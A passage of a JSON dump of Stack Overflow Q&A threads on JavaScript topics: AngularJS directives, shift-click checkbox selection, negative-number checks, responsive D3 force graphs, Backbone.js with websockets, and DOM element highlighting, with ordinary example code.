                    "body": "<p>Looking at the documentation, directives are structures you can write that angularjs parses in order to create objects and behaviors.In other words it's a template in which you use mix of any arbitrary nodes and pseudo-javascript and placeholders for data to express intentions of how your widget (component) is structured, how it behaves and how it is feed with data. \nAngularjs then runs against those <em>directives</em> to translate them into working html/javascript code.</p>\n\n<p>Directives are there to so you can build more complex components (widgets) using proper semantics. Just take a look at the angularjs example of directives - they're defining the tab pane (which isn't of course valid in regular HTML). It's more intuitive than using like div-s or spans to create structure which is then styled to <em>look like</em> a tab pane.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>The homepage is very clear about this:\nWhen you hover over tabs in the last section:</p>\n\n<blockquote>\n  <p>We've extended HTML's vocabulary with a custom <code>tabs</code>\n  element. The <code>tabs</code> abstracts the complex HTML structure\n  and behavior necessary for rendering of tabs. The result is a more\n  readable view and very easily reusable syntax.\"</p>\n</blockquote>\n\n<p>Then in the next tab:</p>\n\n<pre><code>angular.module('components', []).\n  directive('tabs', function() {\n    return {\n      restrict: 'E',\n      transclude: true,\n      scope: {},\n      controller: function($scope, $element) {\n        var panes = $scope.panes = [];\n\n        $scope.select = function(pane) {\n          angular.forEach(panes, function(pane) {\n            pane.selected = false;\n          });\n          pane.selected = true;\n        }\n</code></pre>\n\n<p>So you can invent html elements i.e <code>tabs</code> and let angular handle the rendering of those elements.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<blockquote>\n  <p>What it is (see the clear definition of jQuery as an example)?</p>\n</blockquote>\n\n<p>A directive is essentially a function<sup>&dagger;</sup> that executes when the Angular compiler finds it in the DOM.  The function(s) can do almost anything, which is why I think it is rather difficult to define what a directive is.  Each directive has a name (like ng-repeat, tabs, make-up-your-own) and each directive determines where it can be used: element, attribute, class, in a comment.</p>\n\n<p><sup>&dagger;</sup> A directive normally only has a (post)link function.  A complicated directive could have a compile function, a pre-link function, and a post-link function.</p>\n\n<blockquote>\n  <p>What practical problems and situations is it intended to address?</p>\n</blockquote>\n\n<p>The most powerful thing directives can do is extend HTML.  Your extensions are a <a href=\"http://en.wikipedia.org/wiki/Domain-specific_language\">Domain Specific Language</a> (DSL) for building your application.  E.g., if your application runs an online shopping site, you can extend HTML to have \"shopping-cart\", \"coupon\", \"specials\", etc. directives -- whatever words or objects or concepts are more natural to use within the \"online shopping\" domain, rather than \"div\"s and \"span\"s (as @WTK already mentioned).</p>\n\n<p>Directives can also componentize HTML -- group a bunch of HTML into some reusable component.  If you find yourself using ng-include to pull in lots of HTML, it is probably time to refactor into directives.</p>\n\n<blockquote>\n  <p>What design pattern does it embody, or alternatively, how does it fit into\n  the purported MVC/MVW mission of angularjs</p>\n</blockquote>\n\n<p>Directives are where you manipulate the DOM and catch DOM events.  This is why the directive's compile and link functions both receive the \"element\" as an argument.  You can </p>\n\n<ul>\n<li>define a bunch of HTML (i.e., a template) to replace the directive</li>\n<li>bind events to this element (or its children)</li>\n<li>add/remove a class</li>\n<li>change the text() value</li>\n<li>watch for changes to attributes defined in the same element (actually it is the attributes' values that are watched -- these are scope properties, hence the directive watches the \"model\" for changes)</li>\n<li>etc.</li>\n</ul>\n\n<p><hr>\nIn HTML we have things like <code>&lt;a href=\"...\"&gt;</code>, <code>&lt;img src=\"...\"&gt;</code>, <code>&lt;br&gt;</code>, <code>&lt;table&gt;&lt;tr&gt;&lt;th&gt;</code>.  How would you describe what a, href, img, src, br, table, tr, and th are?  That's what a directive is.</p>\n",
                    "is_accepted": true,
                    "score": 43
                },
                {
                    "body": "<p>Maybe a really <strong>simple and initial</strong> definition for angular directives would be </p>\n\n<blockquote>\n  <p>AngularJS directives (ng-directives) are HTML attributes with an ng prefix (ng-model, ng-app, ng-repeat, ng-bind) used by Angular to extends HTML. (<a href=\"http://www.w3schools.com/angular/angular_intro.asp\" rel=\"nofollow\">from: W3schools angular tutorial</a>)</p>\n</blockquote>\n\n<p>Some examples of this would be </p>\n\n<blockquote>\n  <p>The <strong>ng-app</strong> directive defines an AngularJS application.</p>\n  \n  <p>The <strong>ng-model</strong> directive binds the value of HTML controls (input,\n  select, textarea) to application data.</p>\n  \n  <p>The <strong>ng-bind</strong> directive binds application data to the HTML view.</p>\n</blockquote>\n\n<pre><code>&lt;div ng-app=\"\"&gt;\n    &lt;p&gt;Name: &lt;input type=\"text\" ng-model=\"name\"&gt;&lt;/p&gt;\n    &lt;p ng-bind=\"name\"&gt;&lt;/p&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>Check this tutorial , at least for me it was one of the best introductions to Angular. A more complete approach would be everything that @mark-rajcok said before.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>I have spent quite a lot of time reading through angularjs documentation and several tutorials, and I have been quite surprised at how unapproachable the documentation is.</p>\n\n<p>I have a simple, answerable question that may also be useful to others looking to pick up angularjs:</p>\n\n<p><strong><em>What is an angularjs directive??</em></strong></p>\n\n<p>There should be a simple, precise definition of a directive somewhere, but the <a href=\"http://angularjs.org/\">angularjs website</a> offers these surprisingly useless definitions:</p>\n\n<ul>\n<li><p><em><a href=\"http://angularjs.org/\">On the home page</a></em>:  Directives is a unique and powerful feature available only in Angular. Directives let you invent new HTML syntax, specific to your application.</p></li>\n<li><p><em>In the <a href=\"http://docs.angularjs.org/guide/directive\">developer documentation</a></em>:  Directives are a way to teach HTML new tricks. During DOM compilation directives are matched against the HTML and executed. This allows directives to register behavior, or transform the DOM.</p></li>\n<li><p>There is a <a href=\"http://blog.angularjs.org/2012/11/about-those-directives.html\">series of talks</a> about directives which, ironically, seem to assume the audience already understands what they are.</p></li>\n</ul>\n\n<p>Would anyone be able to offer, for clear reference, a precise definition of what a directive is that explains:</p>\n\n<ol>\n<li>What it is (see the clear <a href=\"http://jquery.com/\">definition of jQuery</a> as an example)</li>\n<li>What practical problems and situations it is intended to address</li>\n<li>What design pattern does it embody, or alternatively, how does it fit into the purported MVC/<a href=\"https://plus.google.com/104744871076396904202/posts/DRUAkZmXjNV\">MVW</a> mission of angularjs</li>\n</ol>\n\n<p>thanks!</p>\n",
            "last_activity_date": 1410333404,
            "question_id": 13875466,
            "score": 53,
            "tags": [
                "javascript",
                "angularjs"
            ],
            "title": "What is an angularjs directive?"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<p>This is done through fairly simple javascript.</p>\n\n<p>They keep track of the id of the last checked box and when when another checkbox is checked they use the <a href=\"https://developer.mozilla.org/en-US/docs/DOM/event.shiftKey\">shiftKey event attribute</a> to see if shift was held while clicking the checkbox. If so they set the <a href=\"https://developer.mozilla.org/en-US/docs/DOM/HTMLInputElement\">checked property</a> of each checkbox in between the two to true.</p>\n\n<p>To determine when a box is checked they probably use an <a href=\"https://developer.mozilla.org/en-US/docs/DOM/element.onclick\">onclick</a> event on the checkboxes</p>\n",
                    "is_accepted": false,
                    "score": 29
                },
                {
                    "body": "<p>I wrote a self-contained demo that uses jquery:</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;input type=\"checkbox\" id=\"id_chk1\" class=\"chkbox\" value=\"1\" /&gt;Check 1&lt;br/&gt;\n    &lt;input type=\"checkbox\" id=\"id_chk2\" class=\"chkbox\" value=\"2\" /&gt;Check 2&lt;br/&gt;\n    &lt;input type=\"checkbox\" id=\"id_chk3\" class=\"chkbox\" value=\"3\" /&gt;Check 3&lt;br/&gt;\n    &lt;input type=\"checkbox\" id=\"id_chk4\" class=\"chkbox\" value=\"4\" /&gt;Check 4&lt;br/&gt;\n    &lt;input type=\"checkbox\" id=\"id_chk5\" class=\"chkbox\" value=\"5\" /&gt;Check 5&lt;br/&gt;\n    &lt;input type=\"checkbox\" id=\"id_chk6\" class=\"chkbox\" value=\"6\" /&gt;Check 6&lt;br/&gt;\n    &lt;input type=\"checkbox\" id=\"id_chk7\" class=\"chkbox\" value=\"7\" /&gt;Check 7&lt;br/&gt;\n\n    &lt;script type=\"text/javascript\" src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.3/jquery.min.js\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\"&gt;\n        var lastChecked = null;\n\n        $(document).ready(function() {\n            var $chkboxes = $('.chkbox');\n            $chkboxes.click(function(e) {\n                if(!lastChecked) {\n                    lastChecked = this;\n                    return;\n                }\n\n                if(e.shiftKey) {\n                    var start = $chkboxes.index(this);\n                    var end = $chkboxes.index(lastChecked);\n\n                    $chkboxes.slice(Math.min(start,end), Math.max(start,end)+ 1).prop('checked', lastChecked.checked);\n\n                }\n\n                lastChecked = this;\n            });\n        });\n    &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 63
                },
                {
                    "body": "<p>Got this solution from <a href=\"http://abcoder.com/javascript/jquery/simple-check-uncheck-all-jquery-function/\" rel=\"nofollow\">http://abcoder.com/javascript/jquery/simple-check-uncheck-all-jquery-function/</a> (now dead):</p>\n\n<p><strong>Javascript code</strong></p>\n\n<pre><code>var NUM_BOXES = 10;\n// last checkbox the user clicked\nvar last = -1;\nfunction check(event) {\n// in IE, the event object is a property of the window object\n// in Mozilla, event object is passed to event handlers as a parameter\nif (!event) { event = window.event }\nvar num = parseInt(/box\\[(\\d+)\\]/.exec(this.name)[1]);\nif (event.shiftKey &amp;&amp; last != -1) {\nvar di = num &gt; last ? 1 : -1;\nfor (var i = last; i != num; i += di) {\n  document.forms.boxes['box[' + i + ']'].checked = true;\n }\n}\n  last = num;\n}\nfunction init() {\n  for (var i = 0; i &lt; NUM_BOXES; i++) {\n    document.forms.boxes['box[' + i + ']'].onclick = check;\n  }\n}\n</code></pre>\n\n<p><strong>HTML</strong></p>\n\n<pre><code>&lt;body onload=\"init()\"&gt;\n&lt;form name=\"boxes\"&gt;\n&lt;input name=\"box[0]\" type=\"checkbox\"&gt;\n&lt;input name=\"box[1]\" type=\"checkbox\"&gt;\n&lt;input name=\"box[2]\" type=\"checkbox\"&gt;\n&lt;input name=\"box[3]\" type=\"checkbox\"&gt;\n&lt;input name=\"box[4]\" type=\"checkbox\"&gt;\n&lt;input name=\"box[5]\" type=\"checkbox\"&gt;\n&lt;input name=\"box[6]\" type=\"checkbox\"&gt;\n&lt;input name=\"box[7]\" type=\"checkbox\"&gt;\n&lt;input name=\"box[8]\" type=\"checkbox\"&gt;\n&lt;input name=\"box[9]\" type=\"checkbox\"&gt;\n&lt;/form&gt;&lt;/body&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Well, the post is quite old but here is a solution I've just come across:\n<a href=\"http://www.pengoworks.com/workshop/jquery/field/field.plugin.htm\" rel=\"nofollow\">jQuery Field Plug-In</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>This is jquery solution that I wrote and use it :<br>\n(all checkboxes have same class named <code>chksel</code> and for a faster individual selection a class that will carry the order named <code>chksel_index</code> ; also each <code>checkbox</code> has an attribute named <code>rg</code> that contain same index)</p>\n\n<pre><code>    var chksel_last=-1;\n    $('.chksel').click(function(ev){\n       if(ev.shiftKey){var i=0;\n          if(chksel_last &gt;=0){\n            if($(this).attr('rg') &gt;= chksel_last){\n             for(i=chksel_last;i&lt;=$(this).attr('rg');i++){$('.chksel_'+i).attr('checked','true')}}\n            if($(this).attr('rg') &lt;= chksel_last){for(i=$(this).attr('rg');i&lt;=chksel_last;i++){$('.chksel_'+i).attr('checked','true')}}\n          }  \n          chksel_last=$(this).attr('rg');\n       }else{chksel_last=$(this).attr('rg');}\n }) \n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Recently, I wrote a jQuery plugin that provide that feature and more. </p>\n\n<p>After including the plugin you just need to initialize the context of checkboxes with the following code snippet:</p>\n\n<pre><code>$('#table4').checkboxes({ range: true });\n</code></pre>\n\n<p>Here is the link to the documentation, demo &amp; download: <a href=\"http://rmariuzzo.github.io/checkboxes.js/\" rel=\"nofollow\">http://rmariuzzo.github.io/checkboxes.js/</a></p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>Here is also another implementation similar to Outlooks multiple selection..</p>\n\n<pre><code>    &lt;script type=\"text/javascript\"&gt;\n\nfunction inRange(x, range)\n{\n    return (x &gt;= range[0] &amp;&amp; x &lt;= range[1]);\n}\n\n$(document).ready(function() {\n    var $chkboxes = $('.chkbox');\n    var firstClick = 1;\n    var lastClick = null;\n    var range = [];\n\n    $chkboxes.click(function(e) {\n        if(!e.shiftKey &amp;&amp; !e.ctrlKey) {\n\n            $('#index-' + firstClick).prop('checked', false);\n\n            firstClick = $chkboxes.index(this) + 1;\n\n            if (firstClick !== null &amp;&amp; firstClick !== ($chkboxes.index(this)+1)) {\n                $('#index-' + firstClick).prop('checked', true);\n            }\n        } else if (e.shiftKey) {\n            lastClick = $chkboxes.index(this) + 1;\n            if ((firstClick &lt; lastClick) &amp;&amp; !inRange(lastClick, range)) {\n                for (i = firstClick; i &lt; lastClick; i++) {\n                    $('#index-' + i).prop('checked', true);\n                }\n                range = [firstClick, lastClick];\n            } else if ((firstClick &gt; lastClick) &amp;&amp; !inRange(lastClick, range)) {\n                for (i = lastClick; i &lt; firstClick; i++) {\n                    $('#index-' + i).prop('checked', true);\n                }\n                range = [lastClick, firstClick];\n            } else if ((firstClick &lt; lastClick) &amp;&amp; inRange(lastClick, range)) {\n                for (i = 1; i &lt; 100; i++) {\n                    $('#index-' + i).prop('checked', false);\n                }\n\n                for (i = firstClick; i &lt; lastClick; i++) {\n                    $('#index-' + i).prop('checked', true);\n                }\n                range = [firstClick, lastClick];\n            }else if ((firstClick &gt; lastClick) &amp;&amp; inRange(lastClick, range)) {\n                for (i = 1; i &lt; 100; i++) {\n                    $('#index-' + i).prop('checked', false);\n                }\n\n                for (i = lastClick; i &lt; firstClick; i++) {\n                    $('#index-' + i).prop('checked', true);\n                }\n                range = [lastClick, firstClick];\n            }\n        }\n    });\n});\n</code></pre>\n\n<p></p>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>In GMail, the user can click on one checkbox in the email list, hold down the Shift key, and select a second checkbox. The JavaScript will then select/unselect the checkboxes that are between the two checboxes.</p>\n\n<p>I am curious as to how this is done? Is this JQuery or some basic (or complex) JavaScript?</p>\n",
            "last_activity_date": 1420748156,
            "question_id": 659508,
            "score": 38,
            "tags": [
                "javascript",
                "gmail"
            ],
            "title": "How can I shift-select multiple checkboxes like GMail?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Instead of writing a function to do this check, you should just be able to use this expression:</p>\n\n<pre><code>(number &lt; 0)\n</code></pre>\n\n<p>Javascript will evaluate this expression by first trying to convert the left hand side to a number value before checking if it's less than zero, which seems to be what you wanted.</p>\n\n<hr>\n\n<h3>Specifications and details</h3>\n\n<p>The behavior for <code>x &lt; y</code> is specified in <em>\u00a711.8.1 The Less-than Operator (<code>&lt;</code>)</em>, which uses <em>\u00a711.8.5 The Abstract Relational Comparison Algorithm</em>.</p>\n\n<p>The situation is a lot different if both <code>x</code> and <code>y</code> are strings, but since the right hand side is already a number in <code>(number &lt; 0)</code>, the comparison will attempt to convert the left hand side to a number to be compared numerically. If the left hand side can not be converted to a number, the result is <code>false</code>.</p>\n\n<p>Do note that this may give different results when compared to your regex-based approach, but depending on what is it that you're trying to do, it may end up doing the right thing anyway.</p>\n\n<ul>\n<li><code>\"-0\" &lt; 0</code> is <code>false</code>, which is consistent with the fact that <code>-0 &lt; 0</code> is also <code>false</code>\n(see: <a href=\"http://en.wikipedia.org/wiki/Signed_zero\">signed zero</a>).</li>\n<li><code>\"-Infinity\" &lt; 0</code> is <code>true</code> (infinity is acknowledged)</li>\n<li><code>\"-1e0\" &lt; 0</code> is <code>true</code> (scientific notation literals are accepted)</li>\n<li><code>\"-0x1\" &lt; 0</code> is <code>true</code> (hexadecimal literals are accepted)</li>\n<li><code>\"  -1  \" &lt; 0</code> is <code>true</code> (some forms of whitespaces are allowed)</li>\n</ul>\n\n<p>For each of the above example, the regex method would evaluate to the contrary (<code>true</code> instead of <code>false</code> and vice versa).</p>\n\n<h3>References</h3>\n\n<ul>\n<li><a href=\"http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-262.pdf\">ECMAScript 5 (PDF)</a></li>\n<li><a href=\"http://bclary.com/2004/11/07/#a-11.8.1\">ECMAScript 3, \u00a711.8.1 The Less-than Operator (<code>&lt;</code>)</a></li>\n<li><a href=\"http://bclary.com/2004/11/07/#a-11.8.5\">ECMAScript 3, \u00a711.8.5 The Abstract Relational Comparison Algorithm</a></li>\n</ul>\n\n<h3>See also</h3>\n\n<ul>\n<li><a href=\"http://www.regular-expressions.info/floatingpoint.html\">regular-expressions.info/Matching Floating Point Numbers with a Regular Expression</a></li>\n</ul>\n\n<hr>\n\n<h3>Appendix 1: Conditional operator <code>?:</code></h3>\n\n<p>It should also be said that statements of this form:</p>\n\n<pre><code>if (someCondition) {\n   return valueForTrue;\n} else {\n   return valueForFalse;\n}\n</code></pre>\n\n<p>can be refactored to use the ternary/conditional <code>?:</code> operator (<a href=\"http://bclary.com/2004/11/07/#a-11.12\">\u00a711.12</a>) to simply:</p>\n\n<pre><code>return (someCondition) ? valueForTrue : valueForFalse;\n</code></pre>\n\n<p>Idiomatic usage of <code>?:</code> can make the code more concise and readable.</p>\n\n<h3>Related questions</h3>\n\n<ul>\n<li><a href=\"http://stackoverflow.com/questions/1688337/javascript-if-alternative\">javascript if alternative</a></li>\n<li><a href=\"http://stackoverflow.com/questions/160218/to-ternary-or-not-to-ternary\">To Ternary or Not To Ternary?</a></li>\n</ul>\n\n<hr>\n\n<h3>Appendix 2: Type conversion functions</h3>\n\n<p>Javascript has functions that you can call to perform various type conversions.</p>\n\n<p>Something like the following:</p>\n\n<pre><code>if (someVariable) {\n   return true;\n} else {\n   return false;\n}\n</code></pre>\n\n<p>Can be refactored using the <code>?:</code> operator to:</p>\n\n<pre><code>return (someVariable ? true : false);\n</code></pre>\n\n<p>But you can also further simplify this to:</p>\n\n<pre><code>return Boolean(someVariable);\n</code></pre>\n\n<p>This calls <code>Boolean</code> as a function (<a href=\"http://bclary.com/2004/11/07/#a-15.6.1\">\u00a715.16.1</a>) to perform the desired type conversion. You can similarly call <code>Number</code> as a function (<a href=\"http://bclary.com/2004/11/07/#a-15.7.1\">\u00a715.17.1</a>) to perform a conversion to number.</p>\n\n<h3>Related questions</h3>\n\n<ul>\n<li><a href=\"http://stackoverflow.com/questions/263965/how-can-i-convert-a-string-to-boolean-in-javascript\">How can I convert a string to boolean in JavaScript?</a></li>\n<li><a href=\"http://stackoverflow.com/questions/856324/what-is-the-purpose-of-javascript-new-boolean\">what is the purpose of javascript new Boolean() ?</a></li>\n</ul>\n",
                    "is_accepted": true,
                    "score": 172
                },
                {
                    "body": "<p>How about something as simple as:</p>\n\n<pre><code>function negative(number){\n    return number &lt; 0;\n}\n</code></pre>\n\n<p><s>The <code>* 1</code> part is to convert strings to numbers.</s></p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<pre><code>function negative(n) {\n  return n &lt; 0;\n}\n</code></pre>\n\n<p>Your regex should work fine for string numbers, but this is probably faster.  (edited from comment in similar answer above, conversion with <code>+n</code> is not needed.)</p>\n",
                    "is_accepted": false,
                    "score": 8
                }
            ],
            "body": "<p>I want to check if a number is negative. I'm searching for the <strong>easiest way</strong>, so a predefined javascript function would be the best but I didn't found yet anything, here is what I have so far but I don't think that this is a good way:</p>\n\n<pre><code>  function negative(number) { \n        if (number.match(/^-\\d+$/)) {\n            return true;\n        } else {\n            return false;\n        }\n   }\n</code></pre>\n",
            "last_activity_date": 1373625137,
            "question_id": 3571717,
            "score": 26,
            "tags": [
                "javascript",
                "negative-number"
            ],
            "title": "Javascript negative number"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>The problem is not within <code>.size()</code>, it's that you are stating the SVG dimensions in <code>.attr(\"width\", w) .attr(\"height\", h)</code>. Remove these two attributes and you'll get it right...</p>\n\n<pre><code>var svg = d3.select(\"#viz\").append(\"svg\")\n            .attr(\"id\", \"playgraph\")\n             //better to keep the viewBox dimensions with variables\n            .attr(\"viewBox\", \"0 0 \" + w + \" \" + h )\n            .attr(\"preserveAspectRatio\", \"xMidYMid meet\");\n</code></pre>\n\n<p><a href=\"http://jsfiddle.net/aaSjd/\">http://jsfiddle.net/aaSjd/</a></p>\n",
                    "is_accepted": true,
                    "score": 31
                },
                {
                    "body": "<p>Duopixel is very close to what I needed, except I don't know why he nested two <code>&lt;g&gt;</code> elements and attached the event listeners to the outermost <code>&lt;g&gt;</code> (also requiring an invisible rectangle behind everything to make the g react to events over its whole space).</p>\n\n<p>It's easier to attach the listeners to the <code>&lt;svg&gt;</code> itself and then you only need one internal <code>&lt;g&gt;</code>.</p>\n\n<p>Here is my full-screen force-directed example:</p>\n\n<pre><code>var width = 1000,\n    height = 1000;\n\nvar color = d3.scale.category20();\n\nvar svg = d3.select(\"body\")\n    .append(\"svg\")\n      .attr({\n        \"width\": \"100%\",\n        \"height\": \"100%\"\n      })\n      .attr(\"viewBox\", \"0 0 \" + width + \" \" + height )\n      .attr(\"preserveAspectRatio\", \"xMidYMid meet\")\n      .attr(\"pointer-events\", \"all\")\n    .call(d3.behavior.zoom().on(\"zoom\", redraw));\n\nvar vis = svg\n    .append('svg:g');\n\nfunction redraw() {\n  vis.attr(\"transform\",\n      \"translate(\" + d3.event.translate + \")\"\n      + \" scale(\" + d3.event.scale + \")\");\n}\n\nfunction draw_graph(graph) {\n  var force = d3.layout.force()\n      .charge(-120)\n      .linkDistance(30)\n      .nodes(graph.nodes)\n      .links(graph.links)\n      .size([width, height])\n      .start();\n\n  var link = vis.selectAll(\".link\")\n      .data(graph.links)\n      .enter().append(\"line\")\n      .attr(\"class\", \"link\")\n      .style(\"stroke-width\", function(d) { return Math.sqrt(d.value); });\n\n  var node = vis.selectAll(\".node\")\n      .data(graph.nodes)\n      .enter().append(\"circle\")\n      .attr(\"class\", \"node\")\n      .attr(\"r\", 5)\n      .style(\"fill\", function(d) { return color(d.group); })\n      .call(force.drag);\n\n  node.append(\"title\")\n      .text(function(d) { return d.name; });\n\n  force.on(\"tick\", function() {\n    link.attr(\"x1\", function(d) { return d.source.x; })\n        .attr(\"y1\", function(d) { return d.source.y; })\n        .attr(\"x2\", function(d) { return d.target.x; })\n        .attr(\"y2\", function(d) { return d.target.y; });\n\n    node.attr(\"cx\", function(d) { return d.x; })\n        .attr(\"cy\", function(d) { return d.y; });\n  });\n};\n\ndraw_graph(data);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>The solution shown here: <a href=\"http://bl.ocks.org/mbostock/3355967\" rel=\"nofollow\">http://bl.ocks.org/mbostock/3355967</a> worked well for me!</p>\n\n<pre><code>window.addEventListener('resize', resize); \n\nfunction resize() {\n    width = window.innerWidth, height = window.innerHeight;\n    svg.attr(\"width\", width).attr(\"height\", height);\n    force.size([width, height]).resume();\n}\n</code></pre>\n\n<p>Make sure to run resize() after you have appended all your lines, nodes etc as well.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I have a graph using force layout, but it has a fixed width <code>w</code> and height <code>h</code>:</p>\n\n<pre><code>var svg = d3.select(\"#viz\").append(\"svg\")\n            .attr(\"id\", \"playgraph\")\n            .attr(\"width\", w)\n            .attr(\"height\", h)\n\nvar force = d3.layout.force()\n              .nodes(nodes)\n              .links(links)\n              .charge(-1600)\n              .linkDistance(45)\n              .size([w, h]); \n</code></pre>\n\n<p>which results in a svg graph that does not scale or down despite of changes in screen or browser window size. In order to make it responsive (i.e. automatically resizes itself), I tried using <code>viewBox</code> and <code>preserveAspectRatio</code> attributes:</p>\n\n<pre><code>var svg = d3.select(\"#viz\").append(\"svg\")\n            .attr(\"id\", \"playgraph\")\n            .attr(\"width\", w)\n            .attr(\"height\", h)\n            .attr(\"viewBox\", \"0, 0, 600, 400\")\n            .attr(\"preserveAspectRatio\", \"xMidYMid meet\");\n</code></pre>\n\n<p>Unfortunately, this didn't work as nothing happens when I adjust the browser window size. I wonder if the <code>.size([w, h])</code> of the force graph has anything to do with this.</p>\n\n<p>Please shed some light on how to use <code>viewBox</code> and <code>preserveAspectRatio</code> attributes with force layout graphs.</p>\n",
            "last_activity_date": 1412572339,
            "question_id": 11942500,
            "score": 25,
            "tags": [
                "javascript",
                "svg",
                "d3.js",
                "force-layout"
            ],
            "title": "How to make force layout graph in D3.js responsive to screen/browser size"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>Simply overwrite <code>Backbone.sync</code> so that it sends messages down socket.io and tells the relevant backbonejs models on the server to alter state.</p>\n\n<p>The interesting part of this solution is setting up the master-master relationship. You need to insure that for any client they can only \"update\" the state of models on the server that they have \"ownership\" of to avoid hackers and server-side state corruption.</p>\n\n<p>So for each client they have a set M where that client is the master of all models in M and has a set S where that client has slaves of all the models in S.</p>\n\n<p>It can only force updating on the server of models in M and only one client should have a particular model in M (or you need to implement a solid locking / merging implementation).</p>\n\n<p>Whenever a model on the server is updated you simply push out to any client who has that model in S. (and push to any client who has that model in M if the model is in M for multiple clients).</p>\n\n<p>A lot of thought needs to go into control / permissions and ownership that is normally handled by the MVC controller once a client POST/PUT/DELETE some data.</p>\n",
                    "is_accepted": true,
                    "score": 25
                },
                {
                    "body": "<p>Maybe this excellent tuto will help you:\n<a href=\"http://andyet.net/blog/2011/feb/15/re-using-backbonejs-models-on-the-server-with-node/\">http://andyet.net/blog/2011/feb/15/re-using-backbonejs-models-on-the-server-with-node/</a></p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>Check out backbone.iobind: <a href=\"https://github.com/noveogroup/backbone.iobind\" rel=\"nofollow\">https://github.com/noveogroup/backbone.iobind</a></p>\n\n<p>It overrides <code>Backbone.sync</code> for you.</p>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>A much better approach is event-driven architecture using an event aggregator. Great read on the subject is the following Derick Bailey's article => <a href=\"http://lostechies.com/derickbailey/2012/04/19/decoupling-backbone-apps-from-websockets/\">Decoupling Backbone Apps From WebSockets</a></p>\n\n<p>It keeps stuff highly decoupled, enables easier testing and changing websockets lib, and on top of it all, it doesn't mess up with overriding Backbone's internals like sync()</p>\n",
                    "is_accepted": false,
                    "score": 7
                }
            ],
            "body": "<p>I am just getting into backbone.js and am finding progress a little slow. My main problem is working out how to keep my client and server side models in sync using socket-io (technically I am using now.js but the same principal should apply). </p>\n\n<p>I think the best way is to override the sync method but some simple advice would be <strong>really</strong> welcome.</p>\n",
            "last_activity_date": 1425916338,
            "question_id": 6657968,
            "score": 23,
            "tags": [
                "javascript",
                "node.js",
                "backbone.js",
                "socket.io",
                "nowjs"
            ],
            "title": "How to use backbone.js with websockets/socket-io/nowjs"
        },
        {
            "answer_count": 6,
            "answers": [
                {
                    "body": "<p>I ended up asking in the Firebug group and got some great help:</p>\n\n<p><a href=\"http://groups.google.com/group/firebug/browse_thread/thread/7d4bd89537cd24e7/2c9483d699efe257?hl=en#2c9483d699efe257\">http://groups.google.com/group/firebug/browse_thread/thread/7d4bd89537cd24e7/2c9483d699efe257?hl=en#2c9483d699efe257</a></p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>One simple way to do it is to use an outline instead of a border:</p>\n\n<pre><code>.highlight { outline: 4px solid #07C; }\n</code></pre>\n\n<p>Just add and remove that class to any element you want to select/deselect (code below is not properly tested):</p>\n\n<pre><code>document.body.addEventListener(\"mouseover\", function(e) {\n    e.stopPropagation();\n    e.target.addEventListener(\"mouseout\", function (e) {\n        e.target.className = e.target.className.replace(new RegExp(\" highlight\\\\b\", \"g\"), \"\");\n    });\n    e.target.className += \" highlight\";\n});\n</code></pre>\n\n<p>Since you are using an outline, (which is supported by Chrome) instead of a border, elements will not jump around. I'm using something similar in my <a href=\"https://chrome.google.com/extensions/detail/boamfheepdiallipiieadpmnklbhadhc\" rel=\"nofollow\">EasyReader Extension</a>.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>There was a similar question asked on Stackoverflow and it had lots of good answers:\n<a href=\"http://stackoverflow.com/questions/742210/does-anyone-know-a-dom-inspector-javascript-library-or-plugin\">Does anyone know a DOM inspector javascript library or plugin?</a></p>\n\n<p>For those who are looking for a quick and dirty solution:</p>\n\n<p><a href=\"http://userscripts.org/scripts/review/3006\" rel=\"nofollow\">http://userscripts.org/scripts/review/3006</a> is the easiest. Just put the code within <code>&lt;script&gt;&lt;/script&gt;</code> tags and you are good to go.</p>\n\n<p><a href=\"https://github.com/josscrowcroft/Simple-JavaScript-DOM-Inspector/blob/master/inspector.js\" rel=\"nofollow\">https://github.com/josscrowcroft/Simple-JavaScript-DOM-Inspector/blob/master/inspector.js</a> is slightly better and still very easy to integrate in.</p>\n\n<p>For a more sophisticated element inspector, you might want to check out the SelectorGadget as pointed by Udi. The inspector selection code is in <a href=\"http://www.selectorgadget.com/stable/lib/interface.js\" rel=\"nofollow\">http://www.selectorgadget.com/stable/lib/interface.js</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I wrote an implementation of this using jQuery as a component of another project. The source and documentation are available here: <a href=\"https://github.com/andrewchilds/jQuery.DomOutline\">https://github.com/andrewchilds/jQuery.DomOutline</a></p>\n",
                    "is_accepted": true,
                    "score": 12
                },
                {
